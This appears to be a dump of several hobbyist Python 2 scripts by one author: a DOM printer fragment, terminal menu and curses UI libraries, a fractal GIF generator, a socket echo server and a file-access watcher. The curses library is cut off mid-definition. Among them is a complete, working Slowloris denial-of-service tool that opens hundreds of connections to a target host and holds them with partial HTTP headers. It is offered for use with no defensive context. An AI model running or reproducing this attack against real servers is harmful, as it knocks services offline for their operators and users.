            if SHOW_PATH:
                if isinstance(depth, int):
                    depth = ""
                if SEARCH == None: # don't show path of every element, if looking just for one
                    print str(depth) + "/" + e.getTagName() + "[" + str(cnt) + "]"
            else:
                spacer = (depth * "  ")

                if SHOW_PARAMS:
                    print spacer + e.tagToString() 
                else:
                    print spacer + "<" + e.getTagName() + ">" 

            # recursion goes here
            for c in e.childs:
                if c.isTag():
                    if SHOW_PATH:
                        recWr(c, str(depth) + "/" + e.getTagName() + "[" + str(cnt) + "]")
                    else:
                        recWr(c, depth + 1)
                elif SEARCH != None:
                    search(c, depth)
        elif SEARCH != None:
            search(e, depth)


#= Main program ================================================================
# parse args
parser = argparse.ArgumentParser()
parser.add_argument("filename", metavar="FN", action="store", type=str, help = "Filename or URL (http/https).")
parser.add_argument("-d", "--dont-show-params", action="store_true", default=False, 
                    help = "Don't show tag parameters. Usefull only without --show-path.")
parser.add_argument("-p", "--show-path", action="store_true", default=False, help = "Show tags as path.")
parser.add_argument("-s", "--search", metavar="S", action="store", default=None, help = "Search for given String.")
parser.add_argument("-n", metavar="N", action="store", type=int, default=10, help = "Show N characters around S.")
parser.add_argument("-i", "--ignore-cs", action="store_true", default=False, help = "Don't use case sensitive search.")
args = parser.parse_args()


# global variables, now I am cursed and my soul belongs to hell :P
SHOW_PATH   = args.show_path
SHOW_PARAMS = not args.dont_show_params
SEARCH      = args.search
N           = args.n
IGNORE_CS   = args.ignore_cs
if SEARCH != None:
    SHOW_PATH = True


data = ""
if args.filename.startswith("http") or args.filename.startswith("https") : # read data from web
    file = urllib.urlopen(args.filename)
    data = file.read()
    file.close()
else: # or from file
    file = open(args.filename)
    data = file.read()
    file.close()
if data == "":
    exit(1)

dom = d.parseString(data)

recWr(dom)#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# LinearCUI v1.2.2 (30.04.2010) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in NetBeans IDE 6.9.
# This module support epydoc (http://epydoc.sourceforge.net/).
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#
#
# Notes:
    # Pridat fci pro delsi vstupy - nejspis by se dala postavit na linear editoru.
    # Pridelat fci adwanced linear editor.
"""
LinearCUI v1.2.2 (30.04.2010) by Bystroushaak (bystrousak@kitakitsune.org).\n
This module provides simple text user interface without curses, only with print function.

@todo:
    - advanced linear editor - nekolik rezimu ala vim
"""
#===============================================================================
# Imports ======================================================================
#===============================================================================


#===============================================================================
# Variables ====================================================================
#===============================================================================
WIDTH  = 80
"Width of standard terminal."
HEIGHT = 25
"Height of standard terminal."


#===============================================================================
#= Functions & objects =========================================================
#===============================================================================
def clear():
    """
    Clear screen with "clear" on unix like systems, "CLS" on windows.

    @rtype: None
    """
    import os
    if os.name == "posix":
        os.system('clear')
    elif os.name in ("nt", "dos", "ce"):
        os.system('CLS')
    else:
        pass


def LinearMenu(lines, title = "", prefix = "\t", numbered = True, lastzero = True, clr = True, prompt = ":> "):
    """
    Prints linear menu.

    Return type can by used as poiter to function:
        >>> LinearMenu(
        ...     [
        ...         ["Start", MenuStart],
        ...         None,
        ...         ["Add names", MenuAddNames],
        ...         ["Registration sheduler", MenuRegShed],
        ...         ["Status", MenuStatus],
        ...         None,
        ...         ["Settings", MenuSettings],
        ...         None,
        ...         ["Quit", MenuQuit]
        ...     ],
        ...     title = "Menu;",
        ...     prefix = "\\t"
        ... )()

    So, when user choose some item in menu, function for handling it is called automaticaly..

    @param lines:
        Array with tuples (lists) C{("First item in menu", return_value)}.
        For blank line add B{None} or "".
    @type lines: list

    @param title:
        Title before menu. Default "".
    @type title: string

    @param prefix:
        Prefix before all menu items.
    @type prefix: string

    @param numbered:
        If True, lines will be numbered from 1 to n. Default is True.
    @type numbered: boolean

    @param lastzero:
        If True, last line will be indexed with 0 (this is usefull for back). Default is True.
    @type lastzero: boolean

    @param clr:
        If True, screen will be erased before every menu. Default is True.
    @type clr: boolean

    @param prompt:
        Defines ask prompt. Default is ":> ".
    @type prompt: string

    @return: Depends on content of lines.
    @rtype: lines[user_choice][1]

    @see:
        L{clear()}
    """
    while True:
        if clr:
            clear()

        if title != "":
            print title

        # print content
        cnt  = 0
        cnt2 = 0
        for line in lines:
            cnt2 += 1
            if prefix != "":
                print prefix,

            if (type(line) == list or type(line) == tuple) and len(line) > 1:
                if numbered:
                    cnt += 1
                    if lastzero and cnt2 == len(lines):
                        print "0)",
                    else:
                        print str(cnt) + ")",

                print line[0]
            else:
                if type(line) == tuple or type(line) == list:
                    print line[0]
                elif type(line) == str:
                    print line
                else:
                    print

        # user input
        print
        inp = raw_input(prompt)

        if inp == "" or inp == "\n":
            continue

        # try validity of integer input
        if numbered:
            try:
                if lastzero:
                    ch = 1
                else:
                    ch = 0

                if int(inp) < 0 or int(inp) > cnt - ch:
                    continue
            except Exception, e:
                pass

        # compare user input
        cnt = 0
        for line in lines:
            if (type(line) == list or type(line) == tuple) and len(line) > 1:
                cnt += 1

                if numbered:
                    try:
                        if int(inp) == cnt:
                            return line[1]
                    except:
                        pass

                if line[0].lower().startswith(inp.lower()):
                    return line[1]

        # for last item
        if inp == "0":
            lines.reverse()
            for line in lines:
                if (type(line) == list or type(line) == tuple) and len(line) > 1:
                    return line[1]




def LinearEditorDown(lines, inp, act, start, stop, message):
    """
    Moves focus in L{LinearEditor} up.
    """
    if (inp == "" or inp == "\n" or inp.lower().startswith("down")) and stop + act < len(lines):
        if inp.lower().startswith("down"):
            if inp.lower() == "down" and act + stop + 1 < len(lines):
                act += 1
            tmp = inp.split(" ")
            try:
                if act + stop + int(tmp[1]) < len(lines):
                    act += int(tmp[1])
                else:
                    act = len(lines) - stop
            except:
                pass
        else:
            act += 1

    return lines, inp, act, start, stop, message

def LinearEditorUp(lines, inp, act, start, stop, message):
    """
    Moves focus in L{LinearEditor} up.
    """
    if inp.lower().startswith("up") and start + act > 0:
        if inp.lower() == "up":
            act -= 1
        else:
            tmp = inp.split(" ")
            try:
                act -= int(tmp[1])
                if act < 0:
                    act = 0
            except:
                pass

    return lines, inp, act, start, stop, message

def LinearEditorHelp(lines, inp, act, start, stop, message):
    """
    Shows help for L{LinearEditor()}.
    """
    if inp.lower() == "help":
        LinearEditor(
            [
                "Help:",
                "\tup [num]",
                "\t\tScroll over one line (or num line) up.",
                "",
                "\t[enter]",
                "\t\tScroll one line down.",
                "",
                "\tdown num",
                "\t\tScrolls over num line down.",
                "",
                "\thelp",
                "\t\tShow this help.",
                "",
                "\texit",
                "\t\tSave en exit."
            ],
            message = "[type exit for continue]".center(WIDTH)
        )

    return lines, inp, act, start, stop, message

basicLinearEditorFunctions = [
    LinearEditorDown,
    LinearEditorUp,
    LinearEditorHelp
]
"Array with basic functions for L{LinearEditor}"

def LinearEditor(lines, message = "Type help for help.", functions = basicLinearEditorFunctions, exitcmd = ["exit"], prompt = ":> "):
    """
    Linear editor. Shows lines with text and allows basic operations with them.\n
    User can add his own fuctions as array in parametr functions.

    @param lines:
        Array with lines of text. Long lines will be wrapped into L{WIDTH} characters long lines.
    @type lines: array with strings

    @param message: One line string with small message. Default is C{"Type help for help"}.
    @type message: string

    @param functions: Default is L{basicLinearEditorFunctions}.\n
        If you want add new function, just append L{basicLinearEditorFunctions} with pointer to your function.\n

        Every functions must have these arguments: C{lines, inp, act, start, stop, message}
        and returns: C{lines, inp, act, start, stop, message}.\n
            - lines
                - Same as lines for LinearEditor.
            - inp
                - User input
            - act
                - actual line (used for scrolling)
            - start
                - tells where screen starts - usualy 0
            - stop
                - tells where screen ends
                - usualy C{L{HEIGHT} - 3 - len(message.splitlines())}
            - message
                - small message before prompt

    @type functions: array with poiters to functions

    @param exitcmd: Exit commands. If user type this command, function returns his content. Default is C{["exit"]}
    @type exitcmd: array of strings

    @param prompt:
    @type prompt: string

    @return: modificated lines, last command
    @rtype: array with strings, lastcmd

    @todo:
        - Pridelat funkce ktere umozni;
            - pridat radek / zadany radek
            - upravit radek / zadany radek
            - smazat
            - smazat rozsah
            - premistit
            - premistit rozsah.
    """
    start = 0
    stop  = HEIGHT - 3 - len(message.splitlines())
    act   = 0

    while True:
        clear()

        # print lines
        cnt = 0
        for line in lines[start + act : stop + act]:
            if len(line) < 80:
                print line
                cnt += 1
            else:
                # wrap long lines
                for i in range(len(line) / 80):
                    print line[i * 80 : (i+1) * 80]
                    cnt += 1

                    if cnt >= stop:
                        break

                if cnt >= stop:
                    break

                if len(line) % 80 > 0:
                    print line[(len(line) / 80) * 81 :]
                    cnt += 1

            if cnt >= stop:
                break

        # if screen is longer than text, print blank lines
        if stop + act > len(lines):
            for i in range(stop + act - len(lines)):
                print

        # print some message (default is "Type help for help.")
        print
        print message

        # read user input
        inp = raw_input(prompt)

        # react to user input
        for f in functions:
            lines, inp, act, start, stop, message = f(lines, inp, act, start, stop, message)

        for ecmd in exitcmd:
            if inp.lower() == ecmd:
                return lines, inp


def LinearInput(message, clr = False, prompt = ":> "):
    """
    Get one simple line of user input.

    @param message:
    @type  message: string

    @param clr: True cleans screen before showing message.
    @type  clr: boolean

    @param prompt:
    @type  prompt: string

    @return: User input.
    @rtype:  string

    @see:
        L{clear()}
    """

    if clr:
        clear()

    print message

    return raw_input(prompt)


def LinearQuestion(question, title = "", title_prefix = ".: ", prompt = ":> "):
    """
    Shows ASCII box with some message.

    @param question:
    @type  question: string

    @param title: Title of message. Title is printed into frame.
    @type  title: string

    @param title_prefix: Title prefix. Default is ".: ".
    @type  title_prefix: string

    @param prompt: User prompt.
    @type  prompt: string

    @return: User input.
    @rtype: string

    @see:
        L{clear()}
    """

    # add title prefix
    if title != "" and title_prefix != "":
        prefix = list(title_prefix)
        prefix.reverse()
        prefix = "".join(prefix)
        title = title_prefix + title + prefix

    # prepare question for print
    question = "\n" + question + "\n\n"
    question = question.splitlines()

    # put some blank lines into scr
    scr = ""
    for i in range((HEIGHT / 2) - ((len(question) + 2) / 2)):
        scr += "\n"

    # get length of biggest line in question
    maxlen = 0
    for line in question:
        if len(line) > maxlen:
            maxlen = len(line)

    # print box with message
    scr += (title + ("_" * (maxlen + 2 - len(title)))).center(WIDTH)
    #scr += ("| " + title + ((maxlen - len(title)) * " ") + " |").center(WIDTH)
    for line in question:
        scr += ("| " + line.center(maxlen)  + " |").center(WIDTH)
    scr += ("`" + "-" * (maxlen + 2) + "'").center(WIDTH)

    # some blank lines
    for i in range((HEIGHT / 2) - ((len(question) + 2) / 2)):
        scr += "\n"

    print scr

    return raw_input(prompt)


#===============================================================================
#= Main program ================================================================
#===============================================================================
if __name__ == "__main__":
    pass








#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Half v1.0.0 (11.11.2010) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in Geany text editor.
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import Image
import ImageDraw
import os


#===============================================================================
#= Functions & objects =========================================================
#===============================================================================
class Point():
    def __init__(self, x = 0, y = 0):
        self.x = x
        self.y = y
        
    def setX(self, x):
        self.x = x
        
    def setY(self, y):
        self.y = y
        
    def setXY(self, x, y):
        self.x = x
        self.y = y
        
    def getX(self):
        return self.x
        
    def getY(self):
        return self.y

    def getXY(self):
        return self.x, self.y
        
class Line():
    def __init__(self, pA, pB):
        self.pA = pA
        self.pB = pB
        
    def setPointA(self, pA):
        self.pA = pA
        
    def setPointB(self, pB):
        self.pB = pB
        
    def setPoints(self, pA, pB):
        self.pA = pA
        self.pB = pB
        
    def getPoints(self):
        return self.pA, self.pB
        
    def getPointA(self):
        return self.pA
        
    def getPointB(self):
        return self.pB
        
    def getSLen(self):
        if self.pA.getX() == self.pB.getX():
            t1 = self.pA.getY()
            t2 = self.pB.getY()
        else:
            t1 = self.pA.getX()
            t2 = self.pB.getX()
            
        if t1 > t2:
            return abs(t1 - t2)
        else:
            return abs(t2 - t1)
        
    def draw(self):
        #~ print "[[" + str(self.pA.getX()) + ", " + str(self.pA.getY()) + "], [" + str(self.pB.getX()) + ", " + str(self.pB.getY()) + "]]", self.getSLen()
        draw.line((self.pA.getXY(), (self.pB.getXY())), fill=256)


def computeLines(lines, depth):
    newlines = []

    for line in lines:
        deltalen = line.getSLen() / 2.83
        
        if line.getPointA().getX() == line.getPointB().getX(): # vertical line
            newlines.append(
                Line(
                    Point(line.getPointA().getX() - deltalen, line.getPointA().getY()), 
                    Point(line.getPointA().getX() + deltalen, line.getPointA().getY())
                )
            )
            newlines.append(
                Line(
                    Point(line.getPointB().getX() - deltalen, line.getPointB().getY()), 
                    Point(line.getPointB().getX() + deltalen, line.getPointB().getY())
                )
            )
        elif line.getPointA().getY() == line.getPointB().getY(): # horizontal lines
            newlines.append(
                Line(
                    Point(line.getPointA().getX(), line.getPointA().getY() - deltalen), 
                    Point(line.getPointA().getX(), line.getPointA().getY() + deltalen)
                )
            )
            newlines.append(
                Line(
                    Point(line.getPointB().getX(), line.getPointB().getY() - deltalen), 
                    Point(line.getPointB().getX(), line.getPointB().getY() + deltalen)
                )
            )
        else:
            raise UserWarning("This script can draw only straight lines!")
            
    depth -= 1
    if depth > 1    :
        return lines + computeLines(newlines, depth)
    else:
        return lines + newlines
            
    
        
    

#===============================================================================
#= Main program ================================================================
#===============================================================================
SIZEX = 1020
SIZEY = 720

# little messy
tmp = range(17)
tmp.reverse()
r = range(18) + tmp[:-1]
del tmp

cnt = 0
for i in r:
    i = i + 2
    im = Image.new("1", (SIZEX, SIZEY))
    draw = ImageDraw.Draw(im)
    
    p = Line(Point(0 + SIZEX / 4, SIZEY / 2), Point(SIZEX - SIZEX / 4, SIZEY / 2))
    for line in computeLines([p], i):
        line.draw()
    del draw
    
    im.save(str(cnt) + "_part.gif", "GIF")
    del im
    cnt += 1
    
os.system("gifsicle --delay=100 -loop 0_part.gif 1_part.gif 2_part.gif 3_part.gif 4_part.gif 5_part.gif 6_part.gif 7_part.gif 8_part.gif 9_part.gif 10_part.gif 11_part.gif 12_part.gif 13_part.gif 14_part.gif 15_part.gif 16_part.gif 17_part.gif 18_part.gif 19_part.gif 20_part.gif 21_part.gif 22_part.gif 23_part.gif 24_part.gif 25_part.gif 26_part.gif 27_part.gif 28_part.gif 29_part.gif 30_part.gif 31_part.gif 32_part.gif 33_part.gif -o anim.gif")
os.system("rm *part.gif")




#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v0.0.0 (dd.mm.yy) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/cz/).
# Created in Geany text editor.
#
# Notes:
    # 
#= Imports =====================================================================
import socket
import struct


#= Variables ===================================================================
TIMEOUT = 2
PORT = 8081
ttl = 5

#= Functions & objects =========================================================



#= Main program ================================================================
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s-.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, struct.pack('I', ttl))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("", PORT))
s.listen(5)

print dir(s._sock)
print s._sock
print s.__str__()

icmp = socket.getprotobyname('icmp')

data = ""
while 1:
	print "waiting.."
	client_socket, address = s.accept()
	client_socket.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)
	client_socket.settimeout(2)
	print "got one"
	
	while data.strip() != "q":
		data = client_socket.recv(512)
		client_socket.send(data)

		icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
		icmp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		icmp_socket.bind(("", port))

		print data

	client_socket.close()
	data = ""




#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v0.0.0 (dd.mm.yy) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import telnetlib
import sys
import time
import random
import socket
import argparse

#===============================================================================
# Variables ====================================================================
#===============================================================================


#===============================================================================
#= Functions & objects =========================================================
#===============================================================================
class Blocker():
    def __init__(self, host, port, timeout = 100, id = None):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
        except:
            pass
            
        sock.send("GET /"+ str(random.randint(1000, 10000000)) + " HTTP/1.1\r\n")
        sock.send("Host: "+ host +"\r\n")
        sock.send("User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n")
        sock.send("Content-Length: 42\r\n")
        
        self.id        = id
        self.sock      = sock
        self.timeout   = timeout
        self.last_time = 0
        
        self.block()
        
    def block(self):
        if self.last_time < time.time() - self.timeout:
            try:
                self.sock.send("X-a: b\r\n")
            except socket.error, e:
                pass
        
        if self.id != None:
            print "\t", threadnum, "waiting.."
            
        


#===============================================================================
#= Main program ================================================================
#===============================================================================

# parse args
parser = argparse.ArgumentParser(description = "Slowloris attack implementation in python.")
parser.add_argument('hostname', metavar="hostname[:port]", help='Target hostname (without http://). Default port is 80.')

parser.add_argument("-v", "--version", action="version", version="v0.1.0 (21.05.2011) by Bystroushaak (bystrousak@kitakitsune.org)")
parser.add_argument("-n", "--threads", action="store", type=int, default=800, help="How many threads should block server. Default 800.")
parser.add_argument("-t", "--timeout", action="store", type=int, default=100, help="Timeout in seconds. Default 100s.")
    
args = parser.parse_args()

port = 80

if ":" in args.hostname:
    hostname, port = args.hostname.split(":")
    try:
        port = int(port)
    except:
        print "Bad port specification!"
        sys.exit(1)
else:
    hostname = args.hostname

threads = args.threads
timeout = args.timeout

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((hostname, port))
except:
    print "Host not found!"
    sys.exit(1)

# main code
print "Launching attack:"

loris = []
cnt = 0
while True:
    if cnt < threads:
        b = Blocker(hostname, port, timeout)
        loris.append(b)
        print "Current number of threads:", len(loris)
        
    for b in loris:
        b.block()
        
    time.sleep(0.2)#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Watchmen example v1.0.0 (23.10.2011) by Bystroushaak (bystrousak@kitakitsune.org)
try:
	import pyinotify
except ImportError:
	print "Pro beh teto ukazky potrebujete mit nainstalovany balik 'pyinotify'!"

# sledovany soubor - jde to i rekurzivne
watched_dir = "tajemstvi/hesla.txt"

class EventHandler(pyinotify.ProcessEvent):
	def ohFuck(self, event):
		# zde je na miste nejake lepsi upozorneni, treba mail atp..
		print "Nekdo pristoupil k", event.pathname
		
	def process_IN_ACCESS(self, event):
		self.ohFuck(event)


wm = pyinotify.WatchManager()
notifier = pyinotify.Notifier(wm, EventHandler())
wm.add_watch(watched_dir, pyinotify.ALL_EVENTS, rec=True)

notifier.loop()#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# CUI v0.2.0 (23.03.2010) by Bystroushaak - bystrousak@kitakitsune.org.
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in WingIDE 101.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky
#
# Notes:
    # Predelat na objekty.
# imports
import curses
import time


# variables
KEY_ESC   = chr(27)
KEY_UP    = "KEY_UP"
KEY_DOWN  = "KEY_DOWN"
KEY_LEFT  = "KEY_LEFT"
KEY_RIGHT = "KEY_RIGHT"


# functions & objects
def clear():
    import os
    if os.name == "posix":
        os.system('clear')
    elif os.name in ("nt", "dos", "ce"):
        os.system('CLS')
    else: pass

def initCurses():
    stdscr = curses.initscr()
    curses.noecho()
    curses.cbreak()
    stdscr.keypad(1)
    curses.curs_set(0)
    
    return stdscr
   

def closeCurses(stdscr):
    curses.nocbreak(); 
    stdscr.keypad(0); 
    curses.echo()
    curses.endwin()
 
    
def CenterWindowYX(height, width, maxyx):
    y = (maxyx[0] - height) / 2
    x = (maxyx[1] - width) / 2
    
    return (y, x)

##
# Splits given string after slen chars.
# @param text Text ehich will be splitted.
# @param slen Split len.
def splitAfter(text, slen):
    otxt = []
    tmp = ""
    cnt = 0
    for ch in text:
        if cnt == slen or ch == "\n":
            cnt = 0
            otxt.append(tmp)
            tmp = ""
            
        if ch != "\n":
            tmp += ch
            cnt += 1
    otxt.append(tmp)
            
    return otxt


##
# Curses menu
# @param stdscr Standard curses window.
# @param submenu [("First", firstFunc), ("", none), ("Second", secondFunc)]
# @return Pointer to function from submenu
def Menu(stdscr, submenu, center = True):    
    # get len of biggest line
    maxlen = 0
    for i in submenu:
        if len(i[0]) > maxlen:
            maxlen = len(i[0])
    
    # create window
    width = maxlen + 8
    height = len(submenu) + 4
    centeryx = CenterWindowYX(height, width, stdscr.getmaxyx())    
    menu = curses.newwin(height, width, centeryx[0], centeryx[1])
    menu.border(0)
    
    # print content of menu
    for i in range(len(submenu)):
        if center:
            line = submenu[i][0].center(maxlen)
        else:
            line = submenu[i][0]
            
        if i == 0:
            menu.addstr(i + 2, 4, line, curses.A_BOLD)
        else:
            menu.addstr(i + 2, 4, line)
            
    c = ""
    i = 0
    ch = 0
    stdscr.nodelay(True)
    while c != "\n":        
        # try read char
        try:
            c = stdscr.getkey()
        except:
            c = ""
        
        if c == "KEY_UP" and i > 0:
            ch = -1
        elif c == "KEY_DOWN" and i < len(submenu) - 1:
            ch = 1
            
        # jump over blank lines
        if submenu[i + ch][1] == None:
            tmp = ch
            ch = 0
            while (tmp + i < len(submenu)) and (tmp + i >= 0):
                if submenu[i + tmp][1] != None:
                    ch = tmp 
                    break
                
                if tmp < 0:
                    tmp -= 1
                else:
                    tmp += 1
        
        # change style of line
        if ch != 0:
            if center:
                line = submenu[i][0].center(maxlen)
            else:
                line = submenu[i][0]
                
            menu.addstr(i + 2, 4, " " * maxlen)
            menu.addstr(i + 2, 4, line)
            
            i += ch
            
            if center:
                line = submenu[i][0].center(maxlen)
            else:
                line = submenu[i][0]
            menu.addstr(i + 2, 4, " " * maxlen)
            menu.addstr(i + 2, 4, line, curses.A_BOLD)
            
            ch = 0
        
        # print result
        stdscr.refresh()
        menu.refresh()
        time.sleep(0.1)
        
    menu.nodelay(0)
    
    return submenu[i][1]

## 
# okomentovat
# pridat moznost zalomeni radku
# ?pridat moznost volat ji jako thread?
# @param stdscr Curses window.
# @param textarray Lines of text. 
# @param yx Top left coordinate of List window. Remember, format is [y, x]. Default [0, 0].
# @param maxyx Bottom right coordinates. Remember, format is [y, x]. Default is maximum size of terminal.
# @param binds List of functions which will be called when user press defined key. Format is [["KEY_1", funcOne], ["KEY_2", funcTwo]]. Default is [].
#        Functions gets as parameter stdscr (standard screen), textarray (list of lines), act (actual line pointer), plus (actual scroll). 
#        Actual index of higlighted line is (act + plus). 
#        Every function _must_ return textarray, act, plus.
#        If you want call function everytime when user press some key, bind you function into "ALL".
# @param toptitle Title printed into top border. Default empty ("").
# @param bottomtitle Title printed into bottom border. Default empty ("").
# @param border 0 - print border, None - print nothing. Defualt 0.
# @param wait How long waitn between two keypress. Default is 0.01 s.
# @param endkey Key which ends this funcion. You can also raise exception from binded function and catch it in function which call this. Default is "ALL".
# @return edited_textarray, index_of_higlighted_line
def List(stdscr, textarray, yx = [0, 0], maxyx = None, binds = [], toptitle = "", bottomtitle = "", border = 0, wait = 0.001, endkey = "ALL"):
    if maxyx == None:
        maxyx = []
        maxyx.append(stdscr.getmaxyx()[0] - yx[0])
        maxyx.append(stdscr.getmaxyx()[1] - yx[1])
        
    # create window for list
    w = curses.newwin(maxyx[0], maxyx[1], yx[0], yx[1])
    
    # show borderList
    if border != None:
        w.border(0)
    
    ##
    # Scrolling function
    def scrollList(textarray, act):
        cnt = 0
        # print all lines from buffer
        for line in textarray:
            w.addstr(cnt + 1, 1, (maxyx[1] - 2) * " ") # clear line
            
            # cut long lines (not good)
            if len(line) > maxyx[1] - 2:
                line = line[:maxyx[1] - 2]
            
            if cnt == act: # highlight line with cursor
                w.addstr(cnt + 1, 1, line, curses.A_BOLD)
            else:
                w.addstr(cnt + 1, 1, line)
            cnt += 1
        
    act  = 0
    ch   = 0
    plus = 0
    c    = ""
    stdscr.nodelay(True)
    maxheight = maxyx[0]
    while c != endkey and endkey != "ALL":
        # read key in non-blocking mode
        try:
            c = stdscr.getkey()
        except:
            c = ""
            
        # set change of pointer to actual line (act)
        if c == "KEY_UP":
            ch = -1
        elif c == "KEY_DOWN":
            ch = 1        
        
        # scrolling
        if len(textarray) >= maxheight - 2: # if buffer is bigger than screen
            # end of screen detection
            if (act + ch < (maxheight - 2)) and (act + ch >= 0):
                act += ch  
            
            # scroll down
            if act + ch >= (maxheight - 2) and act + plus <= len(textarray) - 2:
                plus += 1
                
            # scroll up
            if act + ch < 0 and plus > 0:
                plus -= 1            
            
            scrollList(textarray[(0 + plus) : (maxheight - 2) + plus] , act)
        else:
            # end of screen detection
            if (act + ch < len(textarray)) and (act + ch >= 0):
                act += ch 
                
            scrollList(textarray, act)
           
        # map functions to keys
        for f in binds:
            if f[0] == c or f[0] == "ALL":
                textarray, act, plus = (f[1])(stdscr, textarray, act, plus)
                
                # redraw windows
                w.erase()
                if border != None:
                    w.border(0)
                stdscr.refresh()
                w.refresh()
                continue
        
        # show titles
        w.addstr(0, 1, toptitle)
        w.addstr(maxyx[0] - 1, 1, bottomtitle)
        
        ch = 0
        w.refresh()
        time.sleep(wait)
    
    return textarray, act + plus

def delLine(stdscr, text, act, plus):
    if len(text) == 0:
        pass
    elif act == 0:
        del text[act]        
    elif plus > 0:
        del text[act + plus]
        plus -= 1
    else:
        del text[act]
        if len(text) == act:
            act -= 1
        
    return text, act, plus
    
##
# Prints notice on screen. User can choose from buttons, or press escape for nothing.
# @param stdscr Standard curses screen.
# @param buttons Displayed buttons. Format is list of buttons with return value ["Button text", WhatReturn]. Default is [["OK", True], ["Storno", False]].
# @param title Title. Default none ("").
# @param wrap Maximum lenght of line. Longer lines will be wrapped. Wrap function wraps also if find \n in line. Default is 30.
# @param key_left Left key for switching between buttons. Default is "KEY_LEFT".
# @param key_left Right key for switching between buttons. Default is "KEY_RIGHT".
# @param esc_key Storno key. If user press this key, functions ends and return None. Default value is ESC (chr(27)).
# @return Second index from button definition or nothind if user press esc_key.
def Notice(stdscr, text, buttons = [["OK", True], ["Storno", False]], title = "", wrap = 30, key_left = "KEY_LEFT", key_right = "KEY_RIGHT", esc_key = chr(27)):
    buttlen = 1
    for i in buttons:
        buttlen += len(i[0]) + 1 
        
    text = splitAfter(text, wrap)
    
    width = buttlen + 2     # minimal width is lenght of buttons text + spacing
    height = len(text) + 4  # minimal height is lenght of selected text + spaces + line for buttons
    
    # compute width
    for i in text:
        if len(i) + 4 > width:
            width = len(i) + 4
        
    # center window and draw it on screen
    yx = CenterWindowYX(height, width, stdscr.getmaxyx())
    w = curses.newwin(height, width, yx[0], yx[1])
    w.border(0)
    
    # print text
    cnt = 1
    for line in text:
        w.addstr(cnt, 2, line)
        cnt += 1
    w.addstr(0, 1, title)
       
    act  = 0
    c    = ""
    stdscr.nodelay(True)
    dist = ((width) - buttlen + 2) / 2 # distance for buttons
    while True:
        # read key in non-blocking mode
        try:
            c = stdscr.getkey()
        except:
            c = ""
            
        # select button
        if c == key_left and act > 0:
            act -= 1
        if c == key_right and act < len(buttons) - 1:
            act += 1
            
        # draw buttons on screen
        buttlen = dist
        for i in range(len(buttons)):
            if c == "\n":
                w.erase()
                stdscr.refresh()
                w.refresh()
                return buttons[act][1]
            
            # highlight selected button
            if act == i:
                w.addstr(len(text) + 2, buttlen, buttons[i][0], curses.A_BOLD)
            else:
                w.addstr(len(text) + 2, buttlen, buttons[i][0])
                
            buttlen += len(buttons[i][0]) + 1
            
        # if user press escape
        if c == esc_key:
            w.erase()
            stdscr.refresh()
            w.refresh()
            return None
                
        w.refresh()
        time.sleep(0.001)
   
##
# Should be raised from binded functions if usel press key (up, down, tab, etc..) for selecting another EditLine.
# Parametr text is text from EditLine, ch is what user pres.
class EditLineSelectException(UserWarning):
